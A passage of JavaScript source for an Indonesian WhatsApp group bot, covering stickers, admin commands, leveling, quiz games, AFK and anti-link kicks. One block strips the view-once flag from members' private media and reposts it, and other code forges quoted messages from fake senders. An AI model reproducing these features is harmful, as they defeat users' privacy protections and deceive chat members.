													filename
													)
												)
											.on('close',
												callback
												);
									}
									);
						};
					download(
						url,
						filename,
						async function() {
							console
								.log(
									'done'
									);
							let media =
								fs
								.readFileSync(
									filename
									)
							let type =
								mime
								.split(
									"/"
									)[
									0
									] +
								"Message"
							if (mime ===
								"image/gif"
								) {
								type =
									MessageType
									.video
								mime =
									Mimetype
									.gif
							}
							if (mime
								.split(
									"/"
									)[
									0
									] ===
								"audio"
								) {
								mime =
									Mimetype
									.mp4Audio
							}
							varo
								.sendMessage(
									to,
									media,
									type, {
										quoted: mek,
										mimetype: mime,
										caption: text,
										thumbnail: Buffer
											.alloc(
												0
												),
										contextInfo: {
											"mentionedJid": mids
										}
									}
									)

							fs.unlinkSync(
								filename
								)
						});
				}
		const sendFileFromUrl =
			async (link, type,
				options
				) => {
				hasil =
					await getBuffer(
						link
						)
				varo
					.sendMessage(
						from,
						hasil,
						type,
						options
						)
					.catch(
						e => {
							fetch
								(
									link)
								.then(
									(
										hasil) => {
										varo
											.sendMessage(
												from,
												hasil,
												type,
												options
												)
											.catch(
												e => {
													varo
														.sendMessage(
															from, {
																url: link
															},
															type,
															options
															)
														.catch(
															e => {
																reply
																	(
																		'_[ ! ] Error_')
																console
																	.log(
																		e
																		)
															}
															)
												}
												)
									}
									)
						})
			}
		const
			sendStickerFromUrl =
			async (to, url) => {
				var names =
					Date
					.now() /
					10000;
				var download =
					function(
						uri,
						filename,
						callback
						) {
						request
							.head(
								uri,
								function(
									err,
									res,
									body
									) {
									request
										(
											uri)
										.pipe(
											fs
											.createWriteStream(
												filename
												)
											)
										.on('close',
											callback
											);
								}
								);
					};
				download(
					url,
					'./VXROST/' +
					names +
					'.png',
					async function() {
						console
							.log(
								'selesai'
								);
						let filess =
							'./VXROST/' +
							names +
							'.png'
						let asw =
							'./VXROST/' +
							names +
							'.webp'
						exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
							(
								err) => {
								let media =
									fs
									.readFileSync(
										asw
										)
								varo
									.sendMessage(
										to,
										media,
										MessageType
										.sticker, {
											quoted: mek
										}
										)
								fs.unlinkSync(
									filess
									)
								fs.unlinkSync(
									asw
									)
							}
							);
					});
			}

		const promoteAdmin =
			async function(to,
				target = []
				) {
				if (!target
					.length >
					0) {
					return reply(
						"No target.."
						)
				}
				let g =
					await varo
					.groupMetadata(
						to)
				let owner =
					g.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
						)
				let me =
					varo
					.user
					.jid
				for (i of
					target
					) {
					if (!i
						.includes(
							me
							) &&
						!i
						.includes(
							owner
							)
						) {
						const
							res =
							await varo
							.groupMakeAdmin(
								to,
								[
									i]
								)
						reply
							(
								`@${mentioned[0].split('@')[0]} is now Admin`)
					}
				}
			}

		const demoteAdmin =
			async function(to,
				target = []
				) {
				if (!target
					.length >
					0) {
					return reply(
						"No target.."
						)
				}
				let g =
					await varo
					.groupMetadata(
						to)
				let owner =
					g.owner
					.replace(
						"c.us",
						"s.whatsapp.net"
						)
				let me =
					varo
					.user
					.jid
				for (i of
					target
					) {
					if (!i
						.includes(
							me
							) &&
						!i
						.includes(
							owner
							)
						) {
						const
							res =
							await varo
							.groupDemoteAdmin(
								to,
								[
									i]
								)
						reply
							(
								`@${mentioned[0].split('@')[0]} is no longer Admin`)

					}
				}
			}
		let authorname = varo
			.contacts[from] !=
			undefined ? varo
			.contacts[from]
			.vname || varo
			.contacts[from]
			.notify : undefined
		if (authorname !=
			undefined) {} else {
			authorname =
				groupName
		}

		function addMetadata(
			packname, author) {
			if (!packname)
				packname =
				'VXRO';
			if (!author)
				author = 'BOT';
			author = author
				.replace(
					/[^a-zA-Z0-9]/g,
					'');
			let name =
				`${author}_${packname}`
			if (fs.existsSync(
					`./VXROST/${name}.exif`
					))
			return `./VXROST/${name}.exif`
			const json = {
				"sticker-pack-name": packname,
				"sticker-pack-publisher": author,
			}
			const littleEndian =
				Buffer.from([
					0x49,
					0x49,
					0x2A,
					0x00,
					0x08,
					0x00,
					0x00,
					0x00,
					0x01,
					0x00,
					0x41,
					0x57,
					0x07,
					0x00
				])
			const bytes = [0x00,
				0x00, 0x16,
				0x00, 0x00,
				0x00
			]
			let len = JSON
				.stringify(json)
				.length
			let last
			if (len > 256) {
				len = len - 256
				bytes.unshift(
					0x01)
			} else {
				bytes.unshift(
					0x00)
			}
			if (len < 16) {
				last = len
					.toString(
						16)
				last = "0" + len
			} else {
				last = len
					.toString(
						16)
			}
			const buf2 = Buffer
				.from(last,
					"hex")
			const buf3 = Buffer
				.from(bytes)
			const buf4 = Buffer
				.from(JSON
					.stringify(
						json))
			const buffer =
				Buffer.concat([
					littleEndian,
					buf2,
					buf3,
					buf4
				])
			fs.writeFile(
				`./VXROST/${name}.exif`,
				buffer, (
					err) => {
					return `./VXROST/${name}.exif`
				})
		}


		const time2 = moment()
			.tz('Asia/Jakarta')
			.format('HH:mm:ss')
		if (time2 <
			"23:59:00") {
			var ucapanWaktu2 =
				'Selamat Malam🌃'
		}
		if (time2 <
			"19:00:00") {
			var ucapanWaktu2 =
				'Good Night🌆'
		}
		if (time2 <
			"18:00:00") {
			var ucapanWaktu2 =
				'Selamat Sore🌇'
		}
		if (time2 <
			"15:00:00") {
			var ucapanWaktu2 =
				'Selamat Siang🏙️'
		}
		if (time2 <
			"11:00:00") {
			var ucapanWaktu2 =
				'Selamat Pagi🌅'
		}
		if (time2 <
			"05:00:00") {
			var ucapanWaktu2 =
				'Selamat Malam🌃'
		}
		const levelRole = level
			.getLevelingLevel(
				sender, _level)
		var role = 'Warrior III'
		if (levelRole <= 5) {
			role = 'Warrior II'
		} else if (levelRole <=
			10) {
			role = 'Warrior I'
		} else if (levelRole <=
			15) {
			role = 'Elite III'
		} else if (levelRole <=
			20) {
			role = 'Elite II'
		} else if (levelRole <=
			25) {
			role = 'Elite I'
		} else if (levelRole <=
			30) {
			role = 'Master III'
		} else if (levelRole <=
			35) {
			role = 'Master II'
		} else if (levelRole <=
			40) {
			role = 'Master I'
		} else if (levelRole <=
			45) {
			role =
				'GrandMaster III'
		} else if (levelRole <=
			50) {
			role =
				'GrandMaster II'
		} else if (levelRole <=
			55) {
			role =
				'GrandMaster I'
		} else if (levelRole <=
			60) {
			role = 'Epic III'
		} else if (levelRole <=
			65) {
			role = 'Epic II'
		} else if (levelRole <=
			70) {
			role = 'Epic I'
		} else if (levelRole <=
			75) {
			role = 'Legend III'
		} else if (levelRole <=
			80) {
			role = 'Legend II'
		} else if (levelRole <=
			85) {
			role = 'Legend I'
		} else if (levelRole <=
			90) {
			role = 'Mythic'
		} else if (levelRole <=
			95) {
			role =
				'Mythical Glory'
		} else if (levelRole >=
			100) {
			role = 'KING OF MYTHICAL GLORY'
		}
		const time3 = moment()
			.tz("Asia/Jakarta")
			.format("HH:mm:ss");
		if (time3 <
			"24:59:00") {
			var ucapanWaktu =
				"Selamat malam";
		}
		if (time3 <
			"19:00:00") {
			var ucapanWaktu =
				"Selamat malam";
		}
		if (time3 <
			"18:00:00") {
			var ucapanWaktu =
				"Selamat sore";
		}
		if (time3 <
			"15:00:00") {
			var ucapanWaktu =
				"Selamat siang";
		}
		if (time3 <
			"11:00:00") {
			var ucapanWaktu =
				"Selamat pagi";
		}
		if (time3 <
			"05:00:00") {
			var ucapanWaktu =
				"Selamat malam";
		}

		const time4 = moment()
		.tz("Asia/Jakarta")
		.format("HH:mm:ss");
	if (time4 <
		"23:59:00") {
		var ucapanWaktu4 =
			"Ini udah malem lho...\nGak tidur?";
	}
	if (time4 <
		"22:00:00") {
		var ucapanWaktu4 =
			"Saatnya gosok gigi dan tidur\nKakak gak tidur?";
	}
	if (time4 <
		"20:00:00") {
		var ucapanWaktu4 =
			"Saatnya makan malam\nKakak udah makan?";
	}
	if (time4 <
		"18:00:00") {
		var ucapanWaktu4 =
			"Jam 5 sore enaknya jalan jalan nih, tapi kemana ya?";
	}
	if (time4 <
		"17:00:00") {
		var ucapanWaktu4 =
			"Konnichiwa onichan, udah mandi belum?";
	}
	if (time4 <
		"15:00:00") {
		var ucapanWaktu4 =
			"Konnichiwa onichan, udah tidur siang belum?";
	}
	if (time4 <
		"14:00:00") {
		var ucapanWaktu4 =
			"Udah jam segini kak\nGak tidur siang?";
	}
	if (time4 <
		"12:00:00") {
		var ucapanWaktu4 =
			"Jam segini enak nya makan yang dingin dingin\nTapi apa ya?";
	}
	if (time4 <
		"11:00:00") {
		var ucapanWaktu4 =
			"Kakak, lagi apa jam segini?";
	}
	if (time4 <
		"09:00:00") {
		var ucapanWaktu4 =
			"Haii kakak!! Udah sarapan belum?";
	}
	if (time4 <
		"08:00:00") {
		var ucapanWaktu4 =
			"Ohayou onichan\n Jangan lupa sarapan";
	}
	if (time4 <
		"06:00:00") {
		var ucapanWaktu4 =
			"Jam 5 pagi!! Bagus untuk olahraga\nKakak gak olahraga?";
	}
	if (time4 <
		"05:00:00") {
		var ucapanWaktu4 =
			"Udah jam 4 pagi udah bangun?\nWah kakak hebat";
	}
	if (time4 <
		"04:00:00") {
		var ucapanWaktu4 =
			"Wah udah jam 3 pagi\nSaatnya bangun";
	}
	if (time4 <
		"03:00:00") {
		var ucapanWaktu4 =
			"Udah jam 2 Dini hari masih bangun?\nKok belum tidur?";
	}
	if (time4 <
		"02:00:00") {
		var ucapanWaktu4 =
			"Sekarang jam 1 Dini hari nih kak\nBelum tidur?";
	}
	if (time4 <
		"01:00:00") {
		var ucapanWaktu4 =
			"Udah tengah malam kak\nBelum tidur?";
	}


		const time5 = moment()
			.tz("Asia/Jakarta")
			.format("HH:mm:ss");
		if (time5 <
			"24:59:00") {
			var ucapanWaktu5 =
				"おやすみなさい";
		}
		if (time5 <
			"19:00:00") {
			var ucapanWaktu5 =
				"ハッピートワイライト";
		}
		if (time5 <
			"18:00:00") {
			var ucapanWaktu5 =
				"こんにちは";
		}
		if (time5 <
			"15:00:00") {
			var ucapanWaktu5 =
				"こんにちは";
		}
		if (time5 <
			"11:00:00") {
			var ucapanWaktu5 =
				"おはようございます";
		}
		if (time5 <
			"05:00:00") {
			var ucapanWaktu5 =
				"おやすみなさい";
		}
		// FUNCTION LEVELING
		if (isGroup && !mek.key
			.fromMe && !level
			.isGained(sender) &&
			isLevelingOn) {
			try {
				level
					.addCooldown(
						sender)
				const checkATM =
					atm
					.checkATMuser(
						sender,
						_uang)
				if (checkATM ===
					undefined)
					atm.addATM(
						sender,
						_uang)
				const uangsaku =
					Math.floor(
						Math
						.random() *
						(15 -
							25 +
							1) +
						20)
				atm.addKoinUser(
					sender,
					uangsaku,
					_uang)
				const
					currentLevel =
					level
					.getLevelingLevel(
						sender,
						_level)
				const amountXp =
					Math.floor(
						Math
						.random() *
						(15 -
							25 +
							1) +
						20)
				const
					requiredXp =
					10 * Math
					.pow(
						currentLevel,
						2) +
					50 *
					currentLevel +
					100
				level
					.addLevelingXp(
						sender,
						amountXp,
						_level)
				if (requiredXp <=
					level
					.getLevelingXp(
						sender,
						_level)
					) {
					level
						.addLevelingLevel(
							sender,
							1,
							_level
							)
					const
						userLevel =
						level
						.getLevelingLevel(
							sender,
							_level
							)
					const
						fetchXp =
						10 *
						Math
						.pow(
							userLevel,
							2) +
						50 *
						userLevel +
						100
					reply(
						`*| LEVEL UP |*\n\n▷ *Nama :* @${sender.split("@")[0]}\n▷ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n▷ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n▷ *Role*: *${role}*`)
				}
			} catch (err) {
				console.error(
					err)
			}
		}
		colors = ['red',
			'white',
			'black', 'blue',
			'yellow',
			'green'
		]
		const isMedia = (
			type ===
			'imageMessage' ||
			type ===
			'videoMessage')
		const isQuotedImage =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'imageMessage')
		const isQuotedVideo =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'videoMessage')
		const isQuotedAudio =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'audioMessage')
		const isQuotedSticker =
			type ===
			'extendedTextMessage' &&
			content.includes(
				'stickerMessage'
				)
		const troli = {
			key: {
				fromMe: false,
				remoteJid: "status@broadcast",
				participant: '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 300,
					status: 200,
					thumbnail: fakeimage,
					surface: 200,
					message: fake,
					orderTitle: 'vxro',
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		const ftext = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "16505434800@s.whatsapp.net"
				} : {})
			},
			message: {
				"extendedTextMessage": {
					"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,
					"title": `Hmm`,
					'jpegThumbnail': fs
						.readFileSync(
							'./VXROMD/vxrobot.jpg'
							)
				}
			}
		}
		 //const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./VXROMD/vxrobot.jpg`)},"title": `VXROBOT`,"description": "Bot WhatsApp", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": `${botname}`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}

		// Anti link
		if (isGroup && isAntiViewOnce && m
			.mtype ==
			'viewOnceMessage') {
			var msg = {
				...mek
			}
			msg.message = mek
				.message
				.viewOnceMessage
				.message
			msg.message[Object
					.keys(msg
						.message
						)[0]]
				.viewOnce =
				false
			reply(
				'Terdeteksi Mengirim Foto/Video ViewOnce')
			varo.copyNForward(
				from, msg)
		}
		if (messagesC.match(
				'https://chat.whatsapp.com/'
				)) {
			if (!isGroup) return
			if (!isAntiLink)
				return
			if (isGroupAdmins)
				return
			varo
				.updatePresence(
					from,
					Presence
					.composing)
			var kic =
				`${sender.split('@')[0]}@s.whatsapp.net`
			xexe =
				`\`\`\`| Antilink Detector |\`\`\`\n\nMaaf @${sender.split('@')[0]} anda akan di kick dari Group`
			varo.groupRemove(
					from, [kic])
				.catch((e) => {
					reply(
						`*ERR:* ${e}`)
				})
			button = [
			{
				buttonId: `${prefix}antilink disable`,
				buttonText: {
					displayText: 'MEMATIKAN ANTILINK'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${xexe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
		}

		//=======autorespin
		stod = `${sender}`
		for (let i = 0; i <
			commandsDB
			.length; i++) {
			if (budy ==
				commandsDB[i]
				.pesan) {
				varo
					.sendMessage(
						from,
						commandsDB[
							i]
						.balasan,
						text, {
							sendEphemeral: true,
							quoted: mek,
							contextInfo: {
								forwardingScore: 600,
								isForwarded: true,
								mentionedJid: [
									stod
								]
							}
						})


			}
		}



		if (isCmd && !isGroup) {
			addBalance(sender,
				randomNomor(
					20),
				balance)
			console.log(color(
					'[CMD]'
					),
				color(
					moment(
						mek
						.messageTimestamp *
						1000
						)
					.format(
						'DD/MM/YYYY HH:mm:ss'
						),
					'yellow'
					),
				color(
					`${command} [${args.length}]`
					))
		}
		if (isCmd && isGroup) {
			addBalance(sender,
				randomNomor(
					20),
				balance)
			console.log(color(
					'[CMD]'
					),
				color(
					moment(
						mek
						.messageTimestamp *
						1000
						)
					.format(
						'DD/MM/YYYY HH:mm:ss'
						),
					'yellow'
					),
				color(
					`${command} [${args.length}]`
					),
				'from',
				color(
					pushname
					), 'in',
				color(
					groupName
					))
		}
		var chats = await varo
			.chats.array.filter(
				v => v.jid
				.endsWith(
					'g.us'))
		chats.map(async ({
			jid
		}) => {
			if (readG ===
				false
				)
				return
			await varo
				.chatRead(
					jid
					)
		})
		var chatss =
			await varo.chats
			.array.filter(v => v
				.jid.endsWith(
					's.whatsapp.net'
					))
		chatss.map(async ({
			jid
		}) => {
			if (readP ===
				false
				)
				return
			await varo
				.chatRead(
					jid
					)
		})

		//Auto Vn
		varo.updatePresence(
			from, Presence
			.recording)



		let {
			banChats,
		} = setting

		function banChat() {
			if (banChats ==
				true) {
				return false
			} else {
				return true
			}
		}
		if (!isGroup && !
			isCmd && !command &&
			!mek.key.fromMe && !
			autorespon) {
			simi =
				await fetchJson(
					`https://api.simsimi.net/v2/?text=${cmd}&lc=id`
					)
			sami = simi.success
			reply(sami)
		}
		if (!setting.autoread) {
			varo.chatRead(
				from)
		}
		if (!setting
			.autocomposing) {
			varo
				.updatePresence(
					from,
					Presence
					.composing)
		}
		if (!setting
			.autorecording) {
			varo
				.updatePresence(
					from,
					Presence
					.recording)
		}
		// Sewa
		_sewa.expiredCheck(
			varo, sewa)
		premium.expiredCheck(
			varo, _premium)
			
			// AUTO
			for (let anji of setiker){
				if (budy === anji){
					result = fs.readFileSync(`./VXROTMP/stick/${anji}.webp`)
					varo.sendMessage(from, result, sticker, { quoted: mek })
					}
			}
			for (let anju of audionye){
				if (budy === anju){
					result = fs.readFileSync(`./VXROTMP/audio/${anju}.mp3`)
					varo.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 0, ptt: true, quoted: mek})
					}
			}
			for (let anjh of imagenye){
				if (budy === anjh){
					result = fs.readFileSync(`./VXROTMP/foto/${anjh}.jpg`)
					varo.sendMessage(from, result, image, { quoted: mek })
					}
			}
			for (let anjl of videonye){
				if (budy === anjl){
					result = fs.readFileSync(`./VXROTMP/video/${anjl}.mp4`)
					varo.sendMessage(from, result, video, { quoted: mek })
					}
			}

		// MUTE
		if (isMuted) {
			if (!
				isGroupAdmins &&
				!isPremium)
				return
		}

		const getWin = (
			userId) => {
				let position =
					false
				Object.keys(
						_win)
					.forEach((
						i) => {
							if (_win[
									i
									]
								.jid ===
								userId
								) {
								position
									=
									i
							}
						})
				if (position !==
					false) {
					return _win[
							position
							]
						.win
				}
			}
		// GAME 
		game.cekWaktuFam(varo,
			family100)

		if (tebakgambar
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakgambar[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var http =
					randomNomor(
						100)
				addBalance(
					sender,
					http,
					balance)
				await reply(
					`\`\`\`| Tebak Gambar |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$ ${http} 💰_`
					)
				delete tebakgambar
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebakgambar.json",
					JSON
					.stringify(
						tebakgambar
						))
			}
		}
		if (game.isfam(from,
				family100)) {
			var anjuy = game
				.getjawaban100(
					from,
					family100)
			for (let i of
				anjuy) {
				if (budy
					.toLowerCase()
					.includes(i)
					) {
					var htgmp =
						Math
						.floor(
							Math
							.random() *
							20
							) +
						1
					addBalance(
						sender,
						htgmp,
						balance
						)
					await reply(
						`*Jawaban benar!!*\n\n*Jawaban :* ${i}\n*Hadiah :* ${htgmp}\n*Jawaban yang belum tertebak :* ${anjuy.length - 1}`
						)
					var anug =
						anjuy
						.indexOf(
							i)
					anjuy
						.splice(
							anug,
							1)
				}
			}
			if (anjuy.length <
				1) {
				varo
					.sendMessage(
						from,
						`Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`,
						text)
				family100
					.splice(game
						.getfamposi(
							from,
							family100
							), 1
						)
			}
		}
		if (tebakanime
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakanime[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmu,
					balance)
				await reply(
					`\`\`\`| Tebak Anime |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmu} 💰_`
					)
				delete tebakanime
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebakanime.json",
					JSON
					.stringify(
						tebakanime
						))
			}
		}
		if (tebaklagu
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebaklagu[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htpl =
					randomNomor(
						100)
				addBalance(
					sender,
					htpl,
					balance)
				await reply(
					`\`\`\`| Tebak Lagu |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htpl} 💰_`
					)
				delete tebaklagu
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebaklagu.json",
					JSON
					.stringify(
						tebaklagu
						))
			}
		}
		if (tebaktebakan
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaktebakan[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htpu =
					randomNomor(
						100)
				addBalance(
					sender,
					htpu,
					balance)
				await reply(
					`\`\`\`| Tebak Tebakan |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htpu} 💰_`
					)
				delete tebaktebakan
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebaktebakan.json",
					JSON
					.stringify(
						tebaktebakan
						))
			}
		}
		if (kuismath
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = kuismath[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htcc =
					randomNomor(
						100)
				addBalance(
					sender,
					htcc,
					balance)
				await reply(
					`\`\`\`| Kuis Matematika |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htcc} 💰_`
					)
				delete kuismath[
					sender
					.split(
						'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/kuismath.json",
					JSON
					.stringify(
						kuismath
						))
			}
		}
		if (asahotak
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = asahotak[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgm =
					randomNomor(
						100)
				addBalance(
					sender,
					htgm,
					balance)
				await reply(
					`\`\`\`| Asah Otak |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgm} 💰_`
					)
				delete asahotak[
					sender
					.split(
						'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/asahotak.json",
					JSON
					.stringify(
						asahotak
						))
			}
		}
		if (caklontong
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				caklontong[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmi =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmi,
					balance)
				await reply(
					`\`\`\`| Caklontong |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmi} 💰_*`
					)
				delete caklontong
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/caklontong.json",
					JSON
					.stringify(
						caklontong
						))
			}
		}
		if (tebakjenaka
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakjenaka[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmuu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmuu,
					balance)
				await reply(
					`\`\`\`| Tebak Jenaka |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmuu} 💰_`
					)
				delete tebakjenaka
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebakjenaka.json",
					JSON
					.stringify(
						tebakjenaka
						))
			}
		}
		if (tebaklirik
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaklirik[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmii =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmii,
					balance)
				await reply(
					`\`\`\`| Tebak Lirik |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmii} 💰_`
					)
				delete tebaklirik
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebaklirik.json",
					JSON
					.stringify(
						tebaklirik
						))
			}
		}
		if (tebakimia
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebakimia[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmcc =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmcc,
					balance)
				await reply(
					`\`\`\`| Tebak Kimia |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmcc} 💰_`
					)
				delete tebakimia
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebakimia.json",
					JSON
					.stringify(
						tebakimia
						))
			}
		}
		if (tebaksiapaaku
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebaksiapaaku[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htgmk =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmk,
					balance)
				await reply(
					`\`\`\`| Tebak Siapakah Aku  |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htgmk} 💰_`
					)
				delete tebaksiapaaku
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebaksiapaaku.json",
					JSON
					.stringify(
						tebaksiapaaku
						))
			}
		}
		if (tebakbendera
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban =
				tebakbendera[
					sender
					.split('@')[
						0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var html =
					randomNomor(
						100)
				addBalance(
					sender,
					html,
					balance)
				await reply(
					`\`\`\`| Tebak Bendera  |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${html} 💰_`
					)
				delete tebakbendera
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/tebakbendera.json",
					JSON
					.stringify(
						tebakbendera
						))
			}
		}
		if (susunkata
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = susunkata[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htmp =
					randomNomor(
						100)
				addBalance(
					sender,
					htmp,
					balance)
				await reply(
					`\`\`\`| Susun Kata  |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htmp} 💰_`
					)
				delete susunkata
					[sender
						.split(
							'@'
							)[0]
						]
				fs.writeFileSync(
					"./database/susunkata.json",
					JSON
					.stringify(
						susunkata
						))
			}
		}
		if (tebakata
			.hasOwnProperty(
				sender.split(
					'@')[0]) &&
			!isCmd) {
			kuis = true
			jawaban = tebakata[
				sender
				.split('@')[
					0]]
			if (budy
				.toLowerCase() ==
				jawaban) {
				var htmu =
					randomNomor(
						100)
				addBalance(
					sender,
					htgmu,
					balance)
				await reply(
					`\`\`\`| Tebak Kata  |\`\`\`\n\n*▷* *Jawaban Benar🎉*\n*▷* *Mendapatkan* : _$${htmu} 💰_`
					)
				delete tebakata[
					sender
					.split(
						'@'
						)[0]
					]
				fs.writeFileSync(
					"./database/tebakata.json",
					JSON
					.stringify(
						tebakata
						))
			}
		}
		// AFK
		if (isGroup) {
			if (!mek.key
				.fromMe && mek
				.key.fromMe)
				return
			for (let x of
					mentionUser) {
				if (afk
					.checkAfkUser(
						x, _afk)
					) {
					const
						getId =
						afk
						.getAfkId(
							x,
							_afk
							)
					const
						getReason =
						afk
						.getAfkReason(
							getId,
							_afk
							)
					const
						getTime =
						afk
						.getAfkTime(
							getId,
							_afk
							)
					const cptl = `*| Away From Keyboard |*\n
@${x.split('@')[0]} sedang AFK!
▷ *Alasan*  : ${getReason}
▷ *Sejak* : ${getTime}`
					varo.sendMessage(from, cptl, text, {contextInfo:{mentionedJid:[x]},quoted:mek})
					varo.sendMessage(x, `*| AFK MESSAGE |*\n\nKamu punya pesan!\n\nGroup : ${groupName}\nSender : @${sender.split('@')[0]}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid:[x,sender]},quoted:mek})
				}
			}
			if (afk
				.checkAfkUser(
					sender, _afk
					)
				) {
				const getTime =
					afk
					.getAfkTime(
						sender,
						_afk)
				const
					getReason =
					afk
					.getAfkReason(
						sender,
						_afk)
				const ittung =
					ms(await Date
						.now() -
						getTime)
				const pep =
					`@${sender.split('@')[0]} is no longer AFK (Away From Keyboard)`
				reply(pep)
				_afk.splice(afk
					.getAfkPosition(
						sender,
						_afk
						), 1
					)
				fs.writeFileSync(
					'./database/user/afk.json',
					JSON
					.stringify(
						_afk
						))
			}
		}
		const sendButLocation =
			async (id, text1,
				desc1, gam1,
				but = [],
				options = {quoted: mek}
				) => {
				kma = gam1
				kntl =
					await varo
					.prepareMessage(
						from,
						kma,
